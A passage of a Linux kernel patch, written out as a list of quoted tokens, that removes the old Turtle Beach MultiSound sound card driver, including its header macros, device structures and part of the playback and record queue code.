"HDEX_MIDI_OUT_START", "(", "8", "+", "HDEX_BASE", ")", "#", "define", "HDEX_MIDI_OUT_STOP", "(", "9", "+", "HDEX_BASE", ")", "#", "define", "HDEX_AUX_REQ", "(", "10", "+", "HDEX_BASE", ")", "#", "define", "HIWORD", "(", "l", ")", "(", "(", "WORD", ")", "((", "((", "DWORD", ")", "(", "l", ")", ")", ">", ">", "16", ")", "&", "0xFFFF", ")", ")", "#", "define", "LOWORD", "(", "l", ")", "(", "(", "WORD", ")", "(", "DWORD", ")", "(", "l", ")", ")", "#", "define", "HIBYTE", "(", "w", ")", "(", "(", "BYTE", ")", "((", "(", "WORD", ")", "(", "w", ")", ">", ">", "8", ")", "&", "0xFF", ")", ")", "#", "define", "LOBYTE", "(", "w", ")", "(", "(", "BYTE", ")", "(", "w", ")", ")", "#", "define", "MAKELONG", "(", "low", ",", "hi", ")", "(", "(", "long", ")", "((", "(", "WORD", ")", "(", "low", ")", ")|", "((", "(", "DWORD", ")", "((", "WORD", ")", "(", "hi", ")", "))", "<<", "16", ")", "))", "#", "define", "MAKEWORD", "(", "low", ",", "hi", ")", "(", "(", "WORD", ")", "((", "(", "BYTE", ")", "(", "low", ")", ")|", "((", "(", "WORD", ")", "((", "BYTE", ")", "(", "hi", ")", "))", "<<", "8", ")", "))", "#", "define", "PCTODSP_OFFSET", "(", "w", ")", "(", "USHORT", ")", "((", "w", ")", "/", "2", ")", "#", "define", "PCTODSP_BASED", "(", "w", ")", "(", "USHORT", ")", "((", "(", "w", ")", "/", "2", ")", "+", "DSP_BASE_ADDR", ")", "#", "define", "DSPTOPC_BASED", "(", "w", ")", "(", "((", "w", ")", "-", "DSP_BASE_ADDR", ")", "*", "2", ")", "#", "ifdef", "SLOWIO", "#", "define", "msnd_outb", "outb_p", "#", "define", "msnd_inb", "inb_p", "#", "else", "#", "define", "msnd_outb", "outb", "#", "define", "msnd_inb", "inb", "#", "endif", "/", "*", "JobQueueStruct", "*", "/", "#", "define", "JQS_wStart", "0x00", "#", "define", "JQS_wSize", "0x02", "#", "define", "JQS_wHead", "0x04", "#", "define", "JQS_wTail", "0x06", "#", "define", "JQS__size", "0x08", "/", "*", "DAQueueDataStruct", "*", "/", "#", "define", "DAQDS_wStart", "0x00", "#", "define", "DAQDS_wSize", "0x02", "#", "define", "DAQDS_wFormat", "0x04", "#", "define", "DAQDS_wSampleSize", "0x06", "#", "define", "DAQDS_wChannels", "0x08", "#", "define", "DAQDS_wSampleRate", "0x0A", "#", "define", "DAQDS_wIntMsg", "0x0C", "#", "define", "DAQDS_wFlags", "0x0E", "#", "define", "DAQDS__size", "0x10", "typedef", "u8", "BYTE", ";", "typedef", "u16", "USHORT", ";", "typedef", "u16", "WORD", ";", "typedef", "u32", "DWORD", ";", "typedef", "void", "__iomem", "*", "LPDAQD", ";", "/", "*", "Generic", "FIFO", "*", "/", "typedef", "struct", "{", "size_t", "n", ",", "len", ";", "char", "*", "data", ";", "int", "head", ",", "tail", ";", "}", "msnd_fifo", ";", "typedef", "struct", "multisound_dev", "{", "/", "*", "Linux", "device", "info", "*", "/", "char", "*", "name", ";", "int", "dsp_minor", ",", "mixer_minor", ";", "int", "ext_midi_dev", ",", "hdr_midi_dev", ";", "/", "*", "Hardware", "resources", "*", "/", "int", "io", ",", "numio", ";", "int", "memid", ",", "irqid", ";", "int", "irq", ",", "irq_ref", ";", "unsigned", "char", "info", ";", "void", "__iomem", "*", "base", ";", "/", "*", "Motorola", "56k", "DSP", "SMA", "*", "/", "void", "__iomem", "*", "SMA", ";", "void", "__iomem", "*", "DAPQ", ",", "*", "DARQ", ",", "*", "MODQ", ",", "*", "MIDQ", ",", "*", "DSPQ", ";", "void", "__iomem", "*", "pwDSPQData", ",", "*", "pwMIDQData", ",", "*", "pwMODQData", ";", "int", "dspq_data_buff", ",", "dspq_buff_size", ";", "/", "*", "State", "variables", "*", "/", "enum", "{", "msndClassic", ",", "msndPinnacle", "}", "type", ";", "fmode_t", "mode", ";", "unsigned", "long", "flags", ";", "#", "define", "F_RESETTING", "0", "#", "define", "F_HAVEDIGITAL", "1", "#", "define", "F_AUDIO_WRITE_INUSE", "2", "#", "define", "F_WRITING", "3", "#", "define", "F_WRITEBLOCK", "4", "#", "define", "F_WRITEFLUSH", "5", "#", "define", "F_AUDIO_READ_INUSE", "6", "#", "define", "F_READING", "7", "#", "define", "F_READBLOCK", "8", "#", "define", "F_EXT_MIDI_INUSE", "9", "#", "define", "F_HDR_MIDI_INUSE", "10", "#", "define", "F_DISABLE_WRITE_NDELAY", "11", "wait_queue_head_t", "writeblock", ";", "wait_queue_head_t", "readblock", ";", "wait_queue_head_t", "writeflush", ";", "spinlock_t", "lock", ";", "int", "nresets", ";", "unsigned", "long", "recsrc", ";", "int", "left_levels", "[", "32", "]", ";", "int", "right_levels", "[", "32", "]", ";", "int", "mixer_mod_count", ";", "int", "calibrate_signal", ";", "int", "play_sample_size", ",", "play_sample_rate", ",", "play_channels", ";", "int", "play_ndelay", ";", "int", "rec_sample_size", ",", "rec_sample_rate", ",", "rec_channels", ";", "int", "rec_ndelay", ";", "BYTE", "bCurrentMidiPatch", ";", "/", "*", "Digital", "audio", "FIFOs", "*", "/", "msnd_fifo", "DAPF", ",", "DARF", ";", "int", "fifosize", ";", "int", "last_playbank", ",", "last_recbank", ";", "/", "*", "MIDI", "in", "callback", "*", "/", "void", "(", "*", "midi_in_interrupt", ")", "(", "struct", "multisound_dev", "*", ");", "}", "multisound_dev_t", ";", "#", "ifndef", "mdelay", "#", "define", "mdelay", "(", "a", ")", "udelay", "(", "(", "a", ")", "*", "1000", ")", "#", "endif", "int", "msnd_register", "(", "multisound_dev_t", "*", "dev", ")", ";", "void", "msnd_unregister", "(", "multisound_dev_t", "*", "dev", ")", ";", "void", "msnd_init_queue", "(", "void", "__iomem", "*", ",", "int", "start", ",", "int", "size", ")", ";", "void", "msnd_fifo_init", "(", "msnd_fifo", "*", "f", ")", ";", "void", "msnd_fifo_free", "(", "msnd_fifo", "*", "f", ")", ";", "int", "msnd_fifo_alloc", "(", "msnd_fifo", "*", "f", ",", "size_t", "n", ")", ";", "void", "msnd_fifo_make_empty", "(", "msnd_fifo", "*", "f", ")", ";", "int", "msnd_fifo_write_io", "(", "msnd_fifo", "*", "f", ",", "char", "__iomem", "*", "buf", ",", "size_t", "len", ")", ";", "int", "msnd_fifo_read_io", "(", "msnd_fifo", "*", "f", ",", "char", "__iomem", "*", "buf", ",", "size_t", "len", ")", ";", "int", "msnd_fifo_write", "(", "msnd_fifo", "*", "f", ",", "const", "char", "*", "buf", ",", "size_t", "len", ")", ";", "int", "msnd_fifo_read", "(", "msnd_fifo", "*", "f", ",", "char", "*", "buf", ",", "size_t", "len", ")", ";", "int", "msnd_send_dsp_cmd", "(", "multisound_dev_t", "*", "dev", ",", "BYTE", "cmd", ")", ";", "int", "msnd_send_word", "(", "multisound_dev_t", "*", "dev", ",", "unsigned", "char", "high", ",", "unsigned", "char", "mid", ",", "unsigned", "char", "low", ")", ";", "int", "msnd_upload_host", "(", "multisound_dev_t", "*", "dev", ",", "char", "*", "bin", ",", "int", "len", ")", ";", "int", "msnd_enable_irq", "(", "multisound_dev_t", "*", "dev", ")", ";", "int", "msnd_disable_irq", "(", "multisound_dev_t", "*", "dev", ")", ";", "#", "endif", "/", "*", "__MSND_H", "*", "/", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "/", "*", "The", "work", "is", "in", "msnd_pinnacle", ".", "c", ",", "just", "define", "MSND_CLASSIC", "before", "it", ".", "*", "/", "#", "define", "MSND_CLASSIC", "#", "include", "\"", "msnd_pinnacle", ".", "c", "\"", "@", "@", "-", "1", ",", "185", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "msnd_classic", ".", "h", "*", "*", "Turtle", "Beach", "MultiSound", "Sound", "Card", "Driver", "for", "Linux", "*", "*", "Some", "parts", "of", "this", "header", "file", "were", "derived", "from", "the", "Turtle", "Beach", "*", "MultiSound", "Driver", "Development", "Kit", ".", "*", "*", "Copyright", "(", "C", ")", "1998", "Andrew", "Veliath", "*", "Copyright", "(", "C", ")", "1993", "Turtle", "Beach", "Systems", ",", "Inc", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "ifndef", "__MSND_CLASSIC_H", "#", "define", "__MSND_CLASSIC_H", "#", "define", "DSP_NUMIO", "0x10", "#", "define", "HP_MEMM", "0x08", "#", "define", "HP_BITM", "0x0E", "#", "define", "HP_WAIT", "0x0D", "#", "define", "HP_DSPR", "0x0A", "#", "define", "HP_PROR", "0x0B", "#", "define", "HP_BLKS", "0x0C", "#", "define", "HPPRORESET_OFF", "0", "#", "define", "HPPRORESET_ON", "1", "#", "define", "HPDSPRESET_OFF", "0", "#", "define", "HPDSPRESET_ON", "1", "#", "define", "HPBLKSEL_0", "0", "#", "define", "HPBLKSEL_1", "1", "#", "define", "HPWAITSTATE_0", "0", "#", "define", "HPWAITSTATE_1", "1", "#", "define", "HPBITMODE_16", "0", "#", "define", "HPBITMODE_8", "1", "#", "define", "HIDSP_INT_PLAY_UNDER", "0x00", "#", "define", "HIDSP_INT_RECORD_OVER", "0x01", "#", "define", "HIDSP_INPUT_CLIPPING", "0x02", "#", "define", "HIDSP_MIDI_IN_OVER", "0x10", "#", "define", "HIDSP_MIDI_OVERRUN_ERR", "0x13", "#", "define", "HDEXAR_CLEAR_PEAKS", "1", "#", "define", "HDEXAR_IN_SET_POTS", "2", "#", "define", "HDEXAR_AUX_SET_POTS", "3", "#", "define", "HDEXAR_CAL_A_TO_D", "4", "#", "define", "HDEXAR_RD_EXT_DSP_BITS", "5", "#", "define", "TIME_PRO_RESET_DONE", "0x028A", "#", "define", "TIME_PRO_SYSEX", "0x0040", "#", "define", "TIME_PRO_RESET", "0x0032", "#", "define", "AGND", "0x01", "#", "define", "SIGNAL", "0x02", "#", "define", "EXT_DSP_BIT_DCAL", "0x0001", "#", "define", "EXT_DSP_BIT_MIDI_CON", "0x0002", "#", "define", "BUFFSIZE", "0x8000", "#", "define", "HOSTQ_SIZE", "0x40", "#", "define", "SRAM_CNTL_START", "0x7F00", "#", "define", "SMA_STRUCT_START", "0x7F40", "#", "define", "DAP_BUFF_SIZE", "0x2400", "#", "define", "DAR_BUFF_SIZE", "0x2000", "#", "define", "DAPQ_STRUCT_SIZE", "0x10", "#", "define", "DARQ_STRUCT_SIZE", "0x10", "#", "define", "DAPQ_BUFF_SIZE", "(", "3", "*", "0x10", ")", "#", "define", "DARQ_BUFF_SIZE", "(", "3", "*", "0x10", ")", "#", "define", "MODQ_BUFF_SIZE", "0x400", "#", "define", "MIDQ_BUFF_SIZE", "0x200", "#", "define", "DSPQ_BUFF_SIZE", "0x40", "#", "define", "DAPQ_DATA_BUFF", "0x6C00", "#", "define", "DARQ_DATA_BUFF", "0x6C30", "#", "define", "MODQ_DATA_BUFF", "0x6C60", "#", "define", "MIDQ_DATA_BUFF", "0x7060", "#", "define", "DSPQ_DATA_BUFF", "0x7260", "#", "define", "DAPQ_OFFSET", "SRAM_CNTL_START", "#", "define", "DARQ_OFFSET", "(", "SRAM_CNTL_START", "+", "0x08", ")", "#", "define", "MODQ_OFFSET", "(", "SRAM_CNTL_START", "+", "0x10", ")", "#", "define", "MIDQ_OFFSET", "(", "SRAM_CNTL_START", "+", "0x18", ")", "#", "define", "DSPQ_OFFSET", "(", "SRAM_CNTL_START", "+", "0x20", ")", "#", "define", "MOP_SYNTH", "0x10", "#", "define", "MOP_EXTOUT", "0x32", "#", "define", "MOP_EXTTHRU", "0x02", "#", "define", "MOP_OUTMASK", "0x01", "#", "define", "MIP_EXTIN", "0x01", "#", "define", "MIP_SYNTH", "0x00", "#", "define", "MIP_INMASK", "0x32", "/", "*", "Classic", "SMA", "Common", "Data", "*", "/", "#", "define", "SMA_wCurrPlayBytes", "0x0000", "#", "define", "SMA_wCurrRecordBytes", "0x0002", "#", "define", "SMA_wCurrPlayVolLeft", "0x0004", "#", "define", "SMA_wCurrPlayVolRight", "0x0006", "#", "define", "SMA_wCurrInVolLeft", "0x0008", "#", "define", "SMA_wCurrInVolRight", "0x000a", "#", "define", "SMA_wUser_3", "0x000c", "#", "define", "SMA_wUser_4", "0x000e", "#", "define", "SMA_dwUser_5", "0x0010", "#", "define", "SMA_dwUser_6", "0x0014", "#", "define", "SMA_wUser_7", "0x0018", "#", "define", "SMA_wReserved_A", "0x001a", "#", "define", "SMA_wReserved_B", "0x001c", "#", "define", "SMA_wReserved_C", "0x001e", "#", "define", "SMA_wReserved_D", "0x0020", "#", "define", "SMA_wReserved_E", "0x0022", "#", "define", "SMA_wReserved_F", "0x0024", "#", "define", "SMA_wReserved_G", "0x0026", "#", "define", "SMA_wReserved_H", "0x0028", "#", "define", "SMA_wCurrDSPStatusFlags", "0x002a", "#", "define", "SMA_wCurrHostStatusFlags", "0x002c", "#", "define", "SMA_wCurrInputTagBits", "0x002e", "#", "define", "SMA_wCurrLeftPeak", "0x0030", "#", "define", "SMA_wCurrRightPeak", "0x0032", "#", "define", "SMA_wExtDSPbits", "0x0034", "#", "define", "SMA_bExtHostbits", "0x0036", "#", "define", "SMA_bBoardLevel", "0x0037", "#", "define", "SMA_bInPotPosRight", "0x0038", "#", "define", "SMA_bInPotPosLeft", "0x0039", "#", "define", "SMA_bAuxPotPosRight", "0x003a", "#", "define", "SMA_bAuxPotPosLeft", "0x003b", "#", "define", "SMA_wCurrMastVolLeft", "0x003c", "#", "define", "SMA_wCurrMastVolRight", "0x003e", "#", "define", "SMA_bUser_12", "0x0040", "#", "define", "SMA_bUser_13", "0x0041", "#", "define", "SMA_wUser_14", "0x0042", "#", "define", "SMA_wUser_15", "0x0044", "#", "define", "SMA_wCalFreqAtoD", "0x0046", "#", "define", "SMA_wUser_16", "0x0048", "#", "define", "SMA_wUser_17", "0x004a", "#", "define", "SMA__size", "0x004c", "#", "ifdef", "HAVE_DSPCODEH", "#", "include", "\"", "msndperm", ".", "c", "\"", "#", "include", "\"", "msndinit", ".", "c", "\"", "#", "define", "PERMCODE", "msndperm", "#", "define", "INITCODE", "msndinit", "#", "define", "PERMCODESIZE", "sizeof", "(", "msndperm", ")", "#", "define", "INITCODESIZE", "sizeof", "(", "msndinit", ")", "#", "else", "#", "ifndef", "CONFIG_MSNDCLAS_INIT_FILE", "#", "define", "CONFIG_MSNDCLAS_INIT_FILE", "\\", "\"", "/", "etc", "/", "sound", "/", "msndinit", ".", "bin", "\"", "#", "endif", "#", "ifndef", "CONFIG_MSNDCLAS_PERM_FILE", "#", "define", "CONFIG_MSNDCLAS_PERM_FILE", "\\", "\"", "/", "etc", "/", "sound", "/", "msndperm", ".", "bin", "\"", "#", "endif", "#", "define", "PERMCODEFILE", "CONFIG_MSNDCLAS_PERM_FILE", "#", "define", "INITCODEFILE", "CONFIG_MSNDCLAS_INIT_FILE", "#", "define", "PERMCODE", "dspini", "#", "define", "INITCODE", "permini", "#", "define", "PERMCODESIZE", "sizeof_dspini", "#", "define", "INITCODESIZE", "sizeof_permini", "#", "endif", "#", "define", "LONGNAME", "\"", "MultiSound", "(", "Classic", "/", "Monterey", "/", "Tahiti", ")", "\"", "#", "endif", "/", "*", "__MSND_CLASSIC_H", "*", "/", "@", "@", "-", "1", ",", "1941", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Turtle", "Beach", "MultiSound", "Sound", "Card", "Driver", "for", "Linux", "*", "Linux", "2", ".", "0", "/", "2", ".", "2", "Version", "*", "*", "msnd_pinnacle", ".", "c", "/", "msnd_classic", ".", "c", "*", "*", "-", "-", "If", "MSND_CLASSIC", "is", "defined", ":", "*", "*", "-", ">", "driver", "for", "Turtle", "Beach", "Classic", "/", "Monterey", "/", "Tahiti", "*", "*", "-", "-", "Else", "*", "*", "-", ">", "driver", "for", "Turtle", "Beach", "Pinnacle", "/", "Fiji", "*", "*", "Copyright", "(", "C", ")", "1998", "Andrew", "Veliath", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "12", "-", "3", "-", "2000", "Modified", "IO", "port", "validation", "Steve", "Sycamore", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "linux", "/", "mutex", ".", "h", ">", "#", "include", "<", "linux", "/", "gfp", ".", "h", ">", "#", "include", "<", "linux", "/", "sched", "/", "signal", ".", "h", ">", "#", "include", "<", "asm", "/", "irq", ".", "h", ">", "#", "include", "<", "asm", "/", "io", ".", "h", ">", "#", "include", "\"", "sound_config", ".", "h", "\"", "#", "include", "\"", "sound_firmware", ".", "h", "\"", "#", "ifdef", "MSND_CLASSIC", "#", "ifndef", "__alpha__", "#", "define", "SLOWIO", "#", "endif", "#", "endif", "#", "include", "\"", "msnd", ".", "h", "\"", "#", "ifdef", "MSND_CLASSIC", "#", "ifdef", "CONFIG_MSNDCLAS_HAVE_BOOT", "#", "define", "HAVE_DSPCODEH", "#", "endif", "#", "include", "\"", "msnd_classic", ".", "h", "\"", "#", "define", "LOGNAME", "\"", "msnd_classic", "\"", "#", "else", "#", "ifdef", "CONFIG_MSNDPIN_HAVE_BOOT", "#", "define", "HAVE_DSPCODEH", "#", "endif", "#", "include", "\"", "msnd_pinnacle", ".", "h", "\"", "#", "define", "LOGNAME", "\"", "msnd_pinnacle", "\"", "#", "endif", "#", "ifndef", "CONFIG_MSND_WRITE_NDELAY", "#", "define", "CONFIG_MSND_WRITE_NDELAY", "1", "#", "endif", "#", "define", "get_play_delay_jiffies", "(", "size", ")", "(", "(", "size", ")", "*", "HZ", "*", "\\", "dev", ".", "play_sample_size", "/", "8", "/", "\\", "dev", ".", "play_sample_rate", "/", "\\", "dev", ".", "play_channels", ")", "#", "define", "get_rec_delay_jiffies", "(", "size", ")", "(", "(", "size", ")", "*", "HZ", "*", "\\", "dev", ".", "rec_sample_size", "/", "8", "/", "\\", "dev", ".", "rec_sample_rate", "/", "\\", "dev", ".", "rec_channels", ")", "static", "DEFINE_MUTEX", "(", "msnd_pinnacle_mutex", ")", ";", "static", "multisound_dev_t", "dev", ";", "#", "ifndef", "HAVE_DSPCODEH", "static", "char", "*", "dspini", ",", "*", "permini", ";", "static", "int", "sizeof_dspini", ",", "sizeof_permini", ";", "#", "endif", "static", "int", "dsp_full_reset", "(", "void", ")", ";", "static", "void", "dsp_write_flush", "(", "void", ")", ";", "static", "__inline__", "int", "chk_send_dsp_cmd", "(", "multisound_dev_t", "*", "dev", ",", "register", "BYTE", "cmd", ")", "{", "if", "(", "msnd_send_dsp_cmd", "(", "dev", ",", "cmd", ")", "=", "=", "0", ")", "return", "0", ";", "dsp_full_reset", "(", ");", "return", "msnd_send_dsp_cmd", "(", "dev", ",", "cmd", ")", ";", "}", "static", "void", "reset_play_queue", "(", "void", ")", "{", "int", "n", ";", "LPDAQD", "lpDAQ", ";", "dev", ".", "last_playbank", "=", "-", "1", ";", "writew", "(", "PCTODSP_OFFSET", "(", "0", "*", "DAQDS__size", ")", ",", "dev", ".", "DAPQ", "+", "JQS_wHead", ")", ";", "writew", "(", "PCTODSP_OFFSET", "(", "0", "*", "DAQDS__size", ")", ",", "dev", ".", "DAPQ", "+", "JQS_wTail", ")", ";", "for", "(", "n", "=", "0", ",", "lpDAQ", "=", "dev", ".", "base", "+", "DAPQ_DATA_BUFF", ";", "n", "<", "3", ";", "+", "+", "n", ",", "lpDAQ", "+", "=", "DAQDS__size", ")", "{", "writew", "(", "PCTODSP_BASED", "(", "(", "DWORD", ")", "(", "DAP_BUFF_SIZE", "*", "n", ")", "),", "lpDAQ", "+", "DAQDS_wStart", ")", ";", "writew", "(", "0", ",", "lpDAQ", "+", "DAQDS_wSize", ")", ";", "writew", "(", "1", ",", "lpDAQ", "+", "DAQDS_wFormat", ")", ";", "writew", "(", "dev", ".", "play_sample_size", ",", "lpDAQ", "+", "DAQDS_wSampleSize", ")", ";", "writew", "(", "dev", ".", "play_channels", ",", "lpDAQ", "+", "DAQDS_wChannels", ")", ";", "writew", "(", "dev", ".", "play_sample_rate", ",", "lpDAQ", "+", "DAQDS_wSampleRate", ")", ";", "writew", "(", "HIMT_PLAY_DONE", "*", "0x100", "+", "n", ",", "lpDAQ", "+", "DAQDS_wIntMsg", ")", ";", "writew", "(", "n", ",", "lpDAQ", "+", "DAQDS_wFlags", ")", ";", "}", "}", "static", "void", "reset_record_queue", "(", "void", ")", "{", "int", "n", ";", "LPDAQD", "lpDAQ", ";", "unsigned", "long", "flags", ";", "dev", ".", "last_recbank", "=", "2", ";", "writew", "(", "PCTODSP_OFFSET", "(", "0", "*", "DAQDS__size", ")", ",", "dev", ".", "DARQ", "+", "JQS_wHead", ")", ";", "writew", "(", "PCTODSP_OFFSET", "(", "dev", ".", "last_recbank", "*", "DAQDS__size", ")", ",", "dev", ".", "DARQ", "+", "JQS_wTail", ")", ";", "/", "*", "Critical", "section", ":", "bank", "1", "access", "*", "/", "spin_lock_irqsave", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "msnd_outb", "(", "HPBLKSEL_1", ",", "dev", ".", "io", "+", "HP_BLKS", ")", ";", "memset_io", "(", "dev", ".", "base", ",", "0", ",", "DAR_BUFF_SIZE", "*", "3", ")", ";", "msnd_outb", "(", "HPBLKSEL_0", ",", "dev", ".", "io", "+", "HP_BLKS", ")", ";", "spin_unlock_irqrestore", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "for", "(", "n", "=", "0", ",", "lpDAQ", "=", "dev", ".", "base", "+", "DARQ_DATA_BUFF", ";", "n", "<", "3", ";", "+", "+", "n", ",", "lpDAQ", "+", "=", "DAQDS__size", ")", "{", "writew", "(", "PCTODSP_BASED", "(", "(", "DWORD", ")", "(", "DAR_BUFF_SIZE", "*", "n", ")", ")", "+", "0x4000", ",", "lpDAQ", "+", "DAQDS_wStart", ")", ";", "writew", "(", "DAR_BUFF_SIZE", ",", "lpDAQ", "+", "DAQDS_wSize", ")", ";", "writew", "(", "1", ",", "lpDAQ", "+", "DAQDS_wFormat", ")", ";", "writew", "(", "dev", ".", "rec_sample_size", ",", "lpDAQ", "+", "DAQDS_wSampleSize", ")", ";", "writew", "(", "dev", ".", "rec_channels", ",", "lpDAQ", "+", "DAQDS_wChannels", ")", ";", "writew", "(", "dev", ".", "rec_sample_rate", ",", "lpDAQ", "+", "DAQDS_wSampleRate", ")", ";", "writew", "(", "HIMT_RECORD_DONE", "*", "0x100", "+", "n", ",", "lpDAQ", "+", "DAQDS_wIntMsg", ")", ";", "writew", "(", "n", ",", "lpDAQ", "+", "DAQDS_wFlags", ")", ";", "}", "}", "static", "void", "reset_queues", "(", "void", ")", "{", "if", "(", "dev", ".", "mode", "&", "FMODE_WRITE", ")", "{", "msnd_fifo_make_empty", "(", "&", "dev", ".", "DAPF", ")", ";", "reset_play_queue", "(", ");", "}", "if", "(", "dev", ".", "mode", "&", "FMODE_READ", ")", "{", "msnd_fifo_make_empty", "(", "&", "dev", ".", "DARF", ")", ";", "reset_record_queue", "(", ");", "}", "}", "static", "int", "dsp_set_format", "(", "struct", "file", "*", "file", ",", "int", "val", ")", "{", "int", "data", ",", "i", ";", "LPDAQD", "lpDAQ", ",", "lpDARQ", ";", "lpDAQ", "=", "dev", ".", "base", "+", "DAPQ_DATA_BUFF", ";", "lpDARQ", "=", "dev", ".", "base", "+", "DARQ_DATA_BUFF", ";", "switch", "(", "val", ")", "{", "case", "AFMT_U8", ":", "case", "AFMT_S16_LE", ":", "data", "=", "val", ";", "break", ";", "default", ":", "data", "=", "DEFSAMPLESIZE", ";", "break", ";", "}", "for", "(", "i", "=", "0", ";", "i", "<", "3", ";", "+", "+", "i", ",", "lpDAQ", "+", "=", "DAQDS__size", ",", "lpDARQ", "+", "=", "DAQDS__size", ")", "{", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", "writew", "(", "data", ",", "lpDAQ", "+", "DAQDS_wSampleSize", ")", ";", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_READ", ")", "writew", "(", "data", ",", "lpDARQ", "+", "DAQDS_wSampleSize", ")", ";", "}", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", "dev", ".", "play_sample_size", "=", "data", ";", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_READ", ")", "dev", ".", "rec_sample_size", "=", "data", ";", "return", "data", ";", "}", "static", "int", "dsp_get_frag_size", "(", "void", ")", "{", "int", "size", ";", "size", "=", "dev", ".", "fifosize", "/", "4", ";", "if", "(", "size", ">", "32", "*", "1024", ")", "size", "=", "32", "*", "1024", ";", "return", "size", ";", "}", "static", "int", "dsp_ioctl", "(", "struct", "file", "*", "file", ",", "unsigned", "int", "cmd", ",", "unsigned", "long", "arg", ")", "{", "int", "val", ",", "i", ",", "data", ",", "tmp", ";", "LPDAQD", "lpDAQ", ",", "lpDARQ", ";", "audio_buf_info", "abinfo", ";", "unsigned", "long", "flags", ";", "int", "__user", "*", "p", "=", "(", "int", "__user", "*", ")", "arg", ";", "lpDAQ", "=", "dev", ".", "base", "+", "DAPQ_DATA_BUFF", ";", "lpDARQ", "=", "dev", ".", "base", "+", "DARQ_DATA_BUFF", ";", "switch", "(", "cmd", ")", "{", "case", "SNDCTL_DSP_SUBDIVIDE", ":", "case", "SNDCTL_DSP_SETFRAGMENT", ":", "case", "SNDCTL_DSP_SETDUPLEX", ":", "case", "SNDCTL_DSP_POST", ":", "return", "0", ";", "case", "SNDCTL_DSP_GETIPTR", ":", "case", "SNDCTL_DSP_GETOPTR", ":", "case", "SNDCTL_DSP_MAPINBUF", ":", "case", "SNDCTL_DSP_MAPOUTBUF", ":", "return", "-", "EINVAL", ";", "case", "SNDCTL_DSP_GETOSPACE", ":", "if", "(", "!(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", ")", "return", "-", "EINVAL", ";", "spin_lock_irqsave", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "abinfo", ".", "fragsize", "=", "dsp_get_frag_size", "(", ");", "abinfo", ".", "bytes", "=", "dev", ".", "DAPF", ".", "n", "-", "dev", ".", "DAPF", ".", "len", ";", "abinfo", ".", "fragstotal", "=", "dev", ".", "DAPF", ".", "n", "/", "abinfo", ".", "fragsize", ";", "abinfo", ".", "fragments", "=", "abinfo", ".", "bytes", "/", "abinfo", ".", "fragsize", ";", "spin_unlock_irqrestore", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "return", "copy_to_user", "(", "(", "void", "__user", "*", ")", "arg", ",", "&", "abinfo", ",", "sizeof", "(", "abinfo", ")", ")", "?", "-", "EFAULT", ":", "0", ";", "case", "SNDCTL_DSP_GETISPACE", ":", 